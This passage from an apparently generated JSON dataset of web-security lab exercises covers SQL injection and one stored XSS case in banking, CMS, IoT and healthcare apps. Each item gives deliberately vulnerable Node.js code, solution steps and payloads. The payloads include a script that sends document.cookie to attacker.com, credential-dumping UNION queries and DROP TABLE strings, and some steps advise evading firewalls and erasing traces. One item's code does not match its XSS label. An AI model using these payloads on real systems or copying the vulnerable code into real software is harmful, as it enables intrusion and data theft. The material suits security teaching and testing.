      "Inject a SQL payload into the 'fileName' parameter: ' OR 1=1 --",
      "Use UNION SELECT to retrieve user data from the 'users' table",
      "Automate the attack using sqlmap to extract information",
      "Verify the extracted data by analyzing the server response"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/upload', (req, res) => {\n  const fileName = req.body.fileName;\n  const query = `INSERT INTO uploads (file_name) VALUES ('${fileName}')`; \n  db.query(query, (err) => {\n    if (err) res.status(500).send('Error');\n    res.send('File uploaded');\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' UNION SELECT username, password FROM users --",
      "'; SELECT id FROM users WHERE username='admin' --"
    ]
  },
  {
    "Lab scenario": "Banking portal XSS stored in transaction search",
    "Lab Description": "The banking portal's transaction search page is vulnerable to stored XSS. An attacker can inject malicious JavaScript into the search query, which will be stored and executed in the response. To solve: Exploit the XSS vulnerability to steal session tokens.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the request using Burp Suite and modify the transaction search input with a malicious script",
      "Inject a script: <script>document.location='http://attacker.com?cookie=' + document.cookie;</script>",
      "Submit the search request and observe the execution of the script when viewing the transaction results",
      "Verify the stolen session token by checking the attacker’s server logs",
      "Obfuscate the payload to avoid detection by web application firewalls"
    ],
    "Vulnerability name": "XSS",
    "srcCode": "app.get('/search/transactions', (req, res) => {\n  const searchQuery = req.query.query;\n  const query = `SELECT * FROM transactions WHERE description LIKE '%${searchQuery}%'`; \n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Error');\n    res.send(results);\n  });\n});",
    "payloads": [
      "<script>document.location='http://attacker.com?cookie=' + document.cookie;</script>",
      "<img src='x' onerror='alert(document.cookie)'>",
      "<svg onload='alert(document.cookie)'></svg>"
    ]
  },
  {
    "Lab scenario": "IoT dashboard UNION-based SQL injection in device control",
    "Lab Description": "The IoT dashboard allows device control based on the device ID, but it is vulnerable to SQL injection in the device ID parameter. To solve: Use a UNION-based SQL injection to extract sensitive user information from the database.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request with the device ID parameter",
      "Test for SQL injection by injecting ' UNION SELECT NULL, username, email FROM users --'",
      "Enumerate additional columns using the UNION-based attack",
      "Extract sensitive user information such as usernames and emails",
      "Obfuscate the attack and use the extracted data for post-exploitation"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/device/control', (req, res) => {\n  const deviceId = req.query.deviceId;\n  const query = `SELECT id, status FROM devices WHERE id = '${deviceId}'`; \n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Error');\n    res.json(results);\n  });\n});",
    "payloads": [
      "' UNION SELECT NULL, username, email FROM users --",
      "' UNION SELECT username, password FROM users --",
      "'; SELECT id FROM users WHERE username='admin' --"
    ]
  },
  {
    "Lab scenario": "Banking portal Boolean-based Blind SQL injection in account balance query",
    "Lab Description": "The banking portal allows querying of account balances, but it is vulnerable to Boolean-based blind SQL injection. To solve: Use Boolean-based blind SQL injection to infer account balance information by testing for true/false conditions.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the balance query request and modify the account ID parameter",
      "Inject a payload like ' OR 1=1 --' to test for true conditions and ' OR 1=2 --' for false conditions",
      "Use the blind SQL injection technique to extract account balance information by incrementing character positions and testing for correct results",
      "Verify the balance data by analyzing server responses and using sqlmap to automate extraction",
      "Obfuscate the attack and remove any traces of the injection"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/account/balance', (req, res) => {\n  const accountId = req.query.accountId;\n  const query = `SELECT balance FROM accounts WHERE account_id = '${accountId}'`; \n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Error');\n    res.json(results);\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' OR 1=2 --",
      "' AND 1=1 --"
    ]
  },
  {
    "Lab scenario": "CMS search SQL injection in title parameter",
    "Lab Description": "The CMS search functionality is vulnerable to SQL injection in the title query parameter. This allows an attacker to inject SQL queries into the search functionality. To solve: Use a UNION-based SQL injection to enumerate columns and extract sensitive information.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Burp Suite to intercept the search query request and test for SQL injection",
      "Inject the payload ' UNION SELECT NULL, title, content FROM articles --'",
      "Enumerate columns by adjusting the UNION SELECT payload",
      "Extract article titles and contents from the 'articles' table",
      "Verify the attack by analyzing the returned article data"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/search', (req, res) => {\n  const title = req.query.title;\n  const query = `SELECT title, content FROM articles WHERE title LIKE '%${title}%'`; \n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Error');\n    res.json(results);\n  });\n});",
    "payloads": [
      "' UNION SELECT NULL, title, content FROM articles --",
      "' UNION SELECT username, password FROM users --",
      "'; SELECT id FROM users WHERE username='admin' --"
    ]
  },
  {
    "Lab scenario": "IoT dashboard Time-based Blind SQL injection in sensor data query",
    "Lab Description": "The IoT dashboard is vulnerable to time-based blind SQL injection in the sensor data query, allowing an attacker to infer sensor data from the database by observing time delays. To solve: Use time-based blind SQL injection to retrieve sensitive data by introducing delays.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture the request with Burp Suite and identify the sensor ID parameter",
      "Test for time-based SQL injection with payloads like ' OR IF(1=1, SLEEP(5), 0) --'",
      "Infer the data from sensor records by adjusting the time delay in the response",
      "Use sqlmap with --technique=T for time-based exploitation",
      "Verify the results by measuring the delay in response times"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/sensor/data', (req, res) => {\n  const sensorId = req.query.sensorId;\n  const query = `SELECT value FROM sensors WHERE id = '${sensorId}'`; \n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Error');\n    res.json(results);\n  });\n});",
    "payloads": [
      "' OR IF(1=1, SLEEP(5), 0) --",
      "' AND SLEEP(5) --",
      "' OR IF(1=2, SLEEP(5), 0) --"
    ]
  },
  {
    "Lab scenario": "CMS user authentication SQL injection in password reset endpoint",
    "Lab Description": "The CMS is vulnerable to SQL injection in the password reset endpoint, where the user ID is used in an SQL query. To solve: Use UNION-based SQL injection to extract user details and bypass the authentication process.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request with the user ID parameter",
      "Test for SQL injection by injecting ' UNION SELECT NULL, username, password FROM users --'",
      "Use UNION to enumerate additional user data like email and password hashes",
      "Use sqlmap to automate the attack and retrieve full user details",
      "Verify the results by attempting to reset the password using the extracted data"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/password/reset', (req, res) => {\n  const userId = req.body.userId;\n  const query = `SELECT username, password FROM users WHERE id = '${userId}'`; \n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Error');\n    res.json(results);\n  });\n});",
    "payloads": [
      "' UNION SELECT NULL, username, password FROM users --",
      "' UNION SELECT username, email FROM users --",
      "'; SELECT id FROM users WHERE username='admin' --"
    ]
  },
  {
    "Lab scenario": "Banking portal UNION SQL injection in fund transfer",
    "Lab Description": "The banking portal has a fund transfer feature that is vulnerable to UNION-based SQL injection in the transfer amount parameter. To solve: Use a UNION-based SQL injection to extract sensitive banking information from the database, including user details and account balances.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the fund transfer request and modify the amount parameter",
      "Inject a UNION SQL payload like ' UNION SELECT NULL, username, balance FROM accounts --'",
      "Enumerate columns and extract banking data, such as usernames and account balances",
      "Use sqlmap to automate the extraction of account information",
      "Verify the retrieved data and confirm successful exploitation"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/transfer', (req, res) => {\n  const amount = req.body.amount;\n  const query = `SELECT id, account_balance FROM accounts WHERE transfer_amount = '${amount}'`; \n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Error');\n    res.json(results);\n  });\n});",
    "payloads": [
      "' UNION SELECT NULL, username, balance FROM accounts --",
      "' UNION SELECT username, password FROM users --",
      "'; SELECT id FROM users WHERE username='admin' --"
    ]
  },
  {
    "Lab scenario": "CMS article editing SQL injection in article ID",
    "Lab Description": "The CMS article editing functionality uses the article ID in an SQL query without sanitizing the input. This opens the door for SQL injection. To solve: Use SQL injection to modify or delete articles from the CMS by exploiting the vulnerability in the article ID parameter.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the article edit request and locate the article ID parameter",
      "Test for SQL injection by injecting ' OR 1=1 --'",
      "Use UNION-based SQL injection to extract data from the 'articles' table",
      "Craft a payload to delete or modify articles",
      "Obfuscate the payload to avoid detection and confirm successful exploitation"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/article/edit', (req, res) => {\n  const articleId = req.body.articleId;\n  const query = `UPDATE articles SET title = '${req.body.title}' WHERE id = '${articleId}'`; \n  db.query(query, (err) => {\n    if (err) res.status(500).send('Error');\n    res.send('Article updated');\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' UNION SELECT title, content FROM articles --",
      "'; DELETE FROM articles WHERE id=1 --"
    ]
  },
  {
    "Lab scenario": "API gateway SQL injection in API response data query",
    "Lab Description": "The API gateway exposes a vulnerable query endpoint that retrieves response data based on user input. To solve: Use SQL injection to access sensitive data from the API database.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send a request with the vulnerable parameter (e.g., 'id')",
      "Test for SQL injection by injecting payloads such as ' UNION SELECT NULL, id, data FROM response_data --'",
      "Use sqlmap to automate the attack and retrieve sensitive response data",
      "Verify the response data to confirm successful data extraction",
      "Remove traces of exploitation to avoid detection"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/api/query', (req, res) => {\n  const id = req.query.id;\n  const query = `SELECT id, response_data FROM api_data WHERE id = '${id}'`; \n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Error');\n    res.json(results);\n  });\n});",
    "payloads": [
      "' UNION SELECT NULL, id, data FROM response_data --",
      "' UNION SELECT username, password FROM users --",
      "'; SELECT id FROM users WHERE username='admin' --"
    ]
  },
  {
    "Lab scenario": "Banking portal ORDER BY SQL injection in transaction history",
    "Lab Description": "The banking portal transaction history is vulnerable to SQL injection in the 'ORDER BY' clause. An attacker can inject malicious SQL queries into the 'ORDER BY' clause to bypass authentication. To solve: Use UNION-based SQL injection and manipulate the 'ORDER BY' clause to extract sensitive data from the database.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the transaction history request and test for SQL injection in the 'ORDER BY' parameter",
      "Test with ' ORDER BY 1--' to check for SQL injection vulnerability",
      "Use UNION-based SQL injection to enumerate columns and extract data such as account balances and user information",
      "Verify the attack using sqlmap to automate the extraction process",
      "Obfuscate the attack and avoid detection"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/transaction/history', (req, res) => {\n  const accountId = req.query.accountId;\n  const query = `SELECT transaction_id, amount, date FROM transactions WHERE account_id = '${accountId}' ORDER BY date`; \n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Error');\n    res.json(results);\n  });\n});",
    "payloads": [
      "' ORDER BY 1--",
      "' UNION SELECT NULL, username, account_balance FROM users --",
      "' UNION SELECT username, password FROM users --"
    ]
  },
  {
    "Lab scenario": "CMS image upload SQL injection in filename parameter",
    "Lab Description": "The CMS allows image uploads but does not sanitize the filename input. This can lead to SQL injection in the filename parameter. To solve: Use UNION-based SQL injection to extract sensitive database information from the vulnerable filename parameter.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Burp Suite to intercept the image upload request and modify the filename parameter",
      "Inject a payload like ' UNION SELECT NULL, username, email FROM users --'",
      "Test and enumerate the columns by adjusting the payload",
      "Extract sensitive data such as usernames and emails",
      "Verify the results by analyzing the returned data"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/upload/image', (req, res) => {\n  const filename = req.body.filename;\n  const query = `INSERT INTO images (filename) VALUES ('${filename}')`; \n  db.query(query, (err) => {\n    if (err) res.status(500).send('Error');\n    res.send('Image uploaded');\n  });\n});",
    "payloads": [
      "' UNION SELECT NULL, username, email FROM users --",
      "' UNION SELECT username, password FROM users --",
      "'; SELECT id FROM users WHERE username='admin' --"
    ]
  },
  {
    "Lab scenario": "Banking portal GROUP BY SQL injection in account transaction summary",
    "Lab Description": "The banking portal has a vulnerability in the 'GROUP BY' clause of the account transaction summary query. The vulnerability allows an attacker to manipulate the query and access sensitive data. To solve: Use SQL injection to manipulate the 'GROUP BY' clause and extract account balances and transaction details.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request and identify the 'GROUP BY' parameter",
      "Test with ' GROUP BY 1 --' to identify the SQL injection point",
      "Inject a UNION-based SQL injection payload to enumerate columns",
      "Extract account balance information and transaction history from the database",
      "Verify the results and confirm successful exploitation"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/account/transactions', (req, res) => {\n  const accountId = req.query.accountId;\n  const query = `SELECT transaction_id, amount, date FROM transactions WHERE account_id = '${accountId}' GROUP BY date`; \n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Error');\n    res.json(results);\n  });\n});",
    "payloads": [
      "' GROUP BY 1 --",
      "' UNION SELECT NULL, username, account_balance FROM users --",
      "' UNION SELECT username, password FROM users --"
    ]
  },
  {
    "Lab scenario": "API gateway WHERE SQL injection in product details",
    "Lab Description": "The API gateway endpoint for fetching product details is vulnerable to SQL injection in the product ID parameter. This allows an attacker to extract sensitive information from the database. To solve: Use SQL injection to manipulate the 'WHERE' clause and retrieve product data from the database.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send a request to the product details endpoint with the vulnerable product ID parameter",
      "Test for SQL injection by injecting payloads like ' OR 1=1 --'",
      "Enumerate columns using UNION-based SQL injection to extract sensitive product data",
      "Use sqlmap to automate the extraction of product details",
      "Verify the product data and confirm successful exploitation"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/product/details', (req, res) => {\n  const productId = req.query.productId;\n  const query = `SELECT id, name, price FROM products WHERE id = '${productId}'`; \n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Error');\n    res.json(results);\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' UNION SELECT NULL, name, price FROM products --",
      "'; SELECT id FROM products WHERE name='product1' --"
    ]
  },
  {
    "Lab scenario": "CMS search functionality SQL injection in keywords parameter",
    "Lab Description": "The CMS search functionality is vulnerable to SQL injection in the keywords parameter. This allows an attacker to inject SQL queries into the search functionality. To solve: Use SQL injection to extract sensitive information from the database and enumerate articles.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Burp Suite to intercept the search query request and modify the keywords parameter",
      "Test for SQL injection by injecting ' UNION SELECT NULL, title, content FROM articles --'",
      "Enumerate columns to extract article titles and contents",
      "Verify the extracted article data and confirm the success of the attack",
      "Obfuscate the payload to avoid detection"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/search', (req, res) => {\n  const keywords = req.query.keywords;\n  const query = `SELECT title, content FROM articles WHERE keywords LIKE '%${keywords}%'`; \n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Error');\n    res.json(results);\n  });\n});",
    "payloads": [
      "' UNION SELECT NULL, title, content FROM articles --",
      "' UNION SELECT username, email FROM users --",
      "'; SELECT id FROM users WHERE username='admin' --"
    ]
  },
  {
    "Lab scenario": "Banking portal HAVING SQL injection in account balances",
    "Lab Description": "The banking portal has a vulnerability in the 'HAVING' clause of the account balance query, allowing an attacker to inject SQL and bypass security mechanisms. To solve: Use SQL injection in the HAVING clause to extract sensitive banking information.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the account balance request and test for SQL injection in the HAVING clause",
      "Test with ' HAVING 1=1 --' to check for SQL injection vulnerability",
      "Use UNION-based SQL injection to extract sensitive user and account data",
      "Use sqlmap to automate the extraction of account balances",
      "Verify the results by analyzing the returned account information"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/account/balance', (req, res) => {\n  const accountId = req.query.accountId;\n  const query = `SELECT balance FROM accounts WHERE account_id = '${accountId}' HAVING balance > 1000`; \n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Error');\n    res.json(results);\n  });\n});",
    "payloads": [
      "' HAVING 1=1 --",
      "' UNION SELECT NULL, username, account_balance FROM users --",
      "' UNION SELECT username, password FROM users --"
    ]
  },
  {
    "Lab scenario": "CMS article deletion SQL injection in article ID",
    "Lab Description": "The CMS has an endpoint for article deletion that is vulnerable to SQL injection in the article ID parameter. An attacker can delete articles or modify the query to retrieve data from the database. To solve: Use SQL injection to delete articles or retrieve sensitive data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the article deletion request and modify the article ID parameter",
      "Inject the payload ' OR 1=1 --' to manipulate the query",
      "Test the injection with UNION-based SQL to enumerate columns",
      "Delete articles or extract data by modifying the query payload",
      "Verify the deletion and confirm the successful exploitation"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.delete('/article/delete', (req, res) => {\n  const articleId = req.body.articleId;\n  const query = `DELETE FROM articles WHERE id = '${articleId}'`; \n  db.query(query, (err) => {\n    if (err) res.status(500).send('Error');\n    res.send('Article deleted');\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' UNION SELECT title, content FROM articles --",
      "'; DELETE FROM articles WHERE id=1 --"
    ]
  },
  {
    "Lab scenario": "IoT dashboard ORDER BY SQL injection in sensor status query",
    "Lab Description": "The IoT dashboard is vulnerable to SQL injection in the 'ORDER BY' clause of the sensor status query, allowing an attacker to bypass restrictions and extract sensitive sensor data. To solve: Use SQL injection in the 'ORDER BY' clause to retrieve system status and sensitive sensor data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the sensor status request and identify the 'ORDER BY' parameter",
      "Test for SQL injection with ' ORDER BY 1--'",
      "Inject UNION-based SQL injection to retrieve sensor names and statuses",
      "Use sqlmap to automate data extraction",
      "Confirm successful exploitation by analyzing the response data"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/sensor/status', (req, res) => {\n  const sensorId = req.query.sensorId;\n  const query = `SELECT name, status FROM sensors WHERE sensor_id = '${sensorId}' ORDER BY status`; \n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Error');\n    res.json(results);\n  });\n});",
    "payloads": [
      "' ORDER BY 1--",
      "' UNION SELECT NULL, name, status FROM sensors --",
      "' UNION SELECT name, password FROM users --"
    ]
  },
  {
    "Lab scenario": "API gateway WHERE SQL injection in user profile",
    "Lab Description": "The API gateway is vulnerable to SQL injection in the 'WHERE' clause of the user profile query, allowing attackers to extract sensitive user data. The 'user_id' parameter is unsanitized. To solve: Use SQL injection to manipulate the 'WHERE' clause and extract user details.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send a GET request to the user profile endpoint with the vulnerable 'user_id' parameter",
      "Inject payloads like ' OR 1=1 --' to identify the vulnerability",
      "Enumerate columns using UNION-based SQL injection to retrieve sensitive user data",
      "Use sqlmap to automate the exploitation process",
      "Verify the extracted user data and confirm the attack's success"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/user/profile', (req, res) => {\n  const userId = req.query.userId;\n  const query = `SELECT id, name, email FROM users WHERE id = '${userId}'`; \n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Error');\n    res.json(results);\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' UNION SELECT NULL, username, email FROM users --",
      "' UNION SELECT username, password FROM users --"
    ]
  },
  {
    "Lab scenario": "Banking portal SQL injection in the account balance retrieval",
    "Lab Description": "The banking portal has an SQL injection vulnerability in the account balance retrieval query, specifically in the 'account_id' parameter. This vulnerability allows attackers to access sensitive account balance information. To solve: Use SQL injection to manipulate the query and extract the account balance.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the account balance retrieval request and identify the 'account_id' parameter",
      "Inject payloads like ' OR 1=1 --' to confirm the vulnerability",
      "Enumerate columns using UNION-based SQL injection and extract account balance details",
      "Verify successful exploitation using sqlmap to automate data extraction",
      "Confirm the attack by analyzing the response data"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/account/balance', (req, res) => {\n  const accountId = req.query.accountId;\n  const query = `SELECT balance FROM accounts WHERE account_id = '${accountId}'`; \n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Error');\n    res.json(results);\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' UNION SELECT NULL, account_id, balance FROM accounts --",
      "' UNION SELECT username, balance FROM users --"
    ]
  },
  {
    "Lab scenario": "CMS comment form SQL injection in comment ID",
    "Lab Description": "The CMS comment form allows for unsanitized input in the comment ID, making it vulnerable to SQL injection. An attacker can manipulate the comment ID parameter to retrieve or modify comments in the database. To solve: Use SQL injection to extract comment data and manipulate the query.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Burp Suite to intercept the comment form submission and modify the comment ID parameter",
      "Inject SQL payloads like ' UNION SELECT NULL, comment, user FROM comments --'",
      "Enumerate columns to extract comment data",
      "Verify the success of the attack by viewing the returned comments",
      "Obfuscate the attack to evade detection"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/comments', (req, res) => {\n  const commentId = req.body.commentId;\n  const query = `SELECT comment, user FROM comments WHERE id = '${commentId}'`; \n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Error');\n    res.json(results);\n  });\n});",
    "payloads": [
      "' UNION SELECT NULL, comment, user FROM comments --",
      "' UNION SELECT username, password FROM users --",
      "'; SELECT id FROM comments WHERE user='admin' --"
    ]
  },
  {
    "Lab scenario": "API gateway SQL injection in product details lookup",
    "Lab Description": "The API gateway has an SQL injection vulnerability in the product details lookup query, specifically in the 'product_id' parameter. An attacker can retrieve sensitive product data by exploiting the vulnerability. To solve: Use SQL injection to manipulate the 'product_id' parameter and retrieve product details.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Postman to send a GET request to the product details endpoint with the 'product_id' parameter",
      "Inject payloads like ' OR 1=1 --' to confirm the vulnerability",
      "Use UNION-based SQL injection to enumerate columns and extract product data",
      "Automate the attack using sqlmap to retrieve all product details",
      "Verify the success of the exploitation by reviewing the retrieved data"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/product/details', (req, res) => {\n  const productId = req.query.productId;\n  const query = `SELECT id, name, description FROM products WHERE id = '${productId}'`; \n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Error');\n    res.json(results);\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' UNION SELECT NULL, name, description FROM products --",
      "' UNION SELECT username, price FROM users --"
    ]
  },
  {
    "Lab scenario": "IoT dashboard GROUP BY SQL injection in sensor statistics",
    "Lab Description": "The IoT dashboard is vulnerable to SQL injection in the 'GROUP BY' clause of the sensor statistics query. An attacker can exploit this vulnerability to manipulate the sensor data summary. To solve: Use SQL injection to modify the 'GROUP BY' clause and retrieve sensitive statistics from the sensors database.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the IoT dashboard and identify the 'GROUP BY' parameter",
      "Inject payloads like ' GROUP BY 1 --' to identify the vulnerability",
      "Use UNION-based SQL injection to retrieve sensitive sensor data",
      "Verify successful exploitation by using sqlmap to automate the data extraction process",
      "Confirm the attack by analyzing the retrieved sensor statistics"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/sensor/statistics', (req, res) => {\n  const sensorId = req.query.sensorId;\n  const query = `SELECT name, status, temperature FROM sensors WHERE sensor_id = '${sensorId}' GROUP BY status`; \n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Error');\n    res.json(results);\n  });\n});",
    "payloads": [
      "' GROUP BY 1 --",
      "' UNION SELECT NULL, name, status FROM sensors --",
      "' UNION SELECT name, status FROM users --"
    ]
  },
  {
    "Lab scenario": "Banking portal SQL injection in account transfer page",
    "Lab Description": "The banking portal account transfer page is vulnerable to SQL injection in the 'amount' parameter, which is unsanitized. An attacker can exploit this vulnerability to manipulate account transfer operations. To solve: Use SQL injection to bypass the transfer amount validation and retrieve sensitive information.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the transfer page and analyze the 'amount' parameter",
      "Test for SQL injection with payloads like ' OR 1=1 --' to confirm the vulnerability",
      "Use UNION-based SQL injection to extract sensitive data from the accounts database",
      "Enumerate sensitive account details such as account numbers and balances",
      "Verify the exploitation by extracting user account information"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/account/transfer', (req, res) => {\n  const amount = req.body.amount;\n  const query = `INSERT INTO transfers (amount) VALUES ('${amount}')`; \n  db.query(query, (err) => {\n    if (err) res.status(500).send('Error');\n    res.send('Transfer successful');\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' UNION SELECT NULL, username, balance FROM users --",
      "' UNION SELECT username, password FROM users --"
    ]
  },
  {
    "Lab scenario": "Inventory API vulnerable to SQL injection via product lookup",
    "Lab Description": "SQL injection is possible in the 'product lookup' due to unsanitized input, enabling attackers to extract private records. The application directly interpolates user input into SQL queries. To solve: exploit the injection to access hidden inventory data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the request using Burp Suite or Postman.",
      "Identify injectable parameter through payload testing like ' OR 1=1 --.",
      "Confirm injection by analyzing unexpected database responses.",
      "Use UNION SELECT or sqlmap to enumerate data from other tables.",
      "Verify the output and document retrieved sensitive data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/api/endpoint', (req, res) => {\n  const param = req.query.param;\n  const query = `SELECT * FROM table WHERE id = '${param}'`;\n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Error');\n    res.json(results);\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "'; DROP TABLE users; --",
      "' UNION SELECT credit_card_number, NULL FROM payments --"
    ]
  },
  {
    "Lab scenario": "Student portal SQL injection in grade report export",
    "Lab Description": "The 'grade report export' fails to sanitize input, leading to SQL injection vulnerabilities in key queries. The application builds an export query using unvalidated student IDs. To solve: extract grade data for all students.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept export request.",
      "Inject test payloads in the student ID parameter.",
      "Detect if unexpected rows are returned.",
      "Use time-based SQLi if blind behavior is observed.",
      "Retrieve and verify all grade report data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/export/grades', (req, res) => {\n  const studentId = req.query.id;\n  const sql = `SELECT * FROM grades WHERE student_id = '${studentId}'`;\n  db.query(sql, (err, results) => {\n    if (err) return res.send(err);\n    res.send(results);\n  });\n});",
    "payloads": [
      "' OR 'a'='a",
      "' UNION SELECT NULL, NULL, password FROM users --",
      "'; DROP TABLE grades; --"
    ]
  },
  {
    "Lab scenario": "Healthcare app SQL injection in prescription history access",
    "Lab Description": "The 'prescription history access' feature allows input to be injected into an SQL query that retrieves prescription records. The application lacks filtering on patient identifiers. To solve: extract prescription data for another patient.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture request to /prescription/history using Postman.",
      "Inject payloads in 'patientId' query param.",
      "Observe database error messages for validation.",
      "Use sqlmap to automate injection and data extraction.",
      "Confirm retrieval of another patient’s data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/prescription/history', (req, res) => {\n  const id = req.body.patientId;\n  const sql = `SELECT * FROM prescriptions WHERE patient_id = '${id}'`;\n  db.query(sql, (err, results) => {\n    if (err) res.status(500).send('Error');\n    else res.json(results);\n  });\n});",
    "payloads": [
      "' UNION SELECT NULL, medication, dose FROM prescriptions --",
      "' OR 1=1 --",
      "' AND sleep(5)--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in ORDER BY Clause",
    "Lab Description": "The banking portal's transaction history feature allows users to sort transactions based on various fields. The application directly incorporates user-supplied input into the ORDER BY clause without proper sanitization, leading to a SQL injection vulnerability. To solve: Exploit the ORDER BY clause to retrieve sensitive user information.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the transaction history endpoint.",
      "Modify the 'sort' parameter to include SQL injection payloads, such as 'amount DESC, (SELECT password FROM users LIMIT 1)--'.",
      "Observe the application's response for any anomalies or data leakage.",
      "Utilize sqlmap to automate the exploitation and extract sensitive data.",
      "Confirm the retrieval of user passwords or other sensitive information."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/transactions', (req, res) => {\n  const sort = req.query.sort;\n  const query = `SELECT * FROM transactions ORDER BY ${sort}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "amount DESC, (SELECT password FROM users LIMIT 1)--",
      "date ASC, (SELECT email FROM users LIMIT 1)--",
      "id, (SELECT credit_card_number FROM users LIMIT 1)--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in GROUP BY Clause",
    "Lab Description": "The CMS's analytics feature groups page views by user-defined criteria. The application incorporates user input directly into the GROUP BY clause without validation, leading to a SQL injection vulnerability. To solve: Exploit the GROUP BY clause to extract administrative user data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to intercept the request to the analytics endpoint.",
      "Inject SQL payloads into the 'group' parameter, such as 'username, (SELECT password FROM admins)--'.",
      "Analyze the response for any unusual behavior or data leakage.",
      "Employ sqlmap with appropriate flags to automate the exploitation.",
      "Verify the extraction of administrative user credentials."
    ],
    "Vulnerability name": "SQL injection",
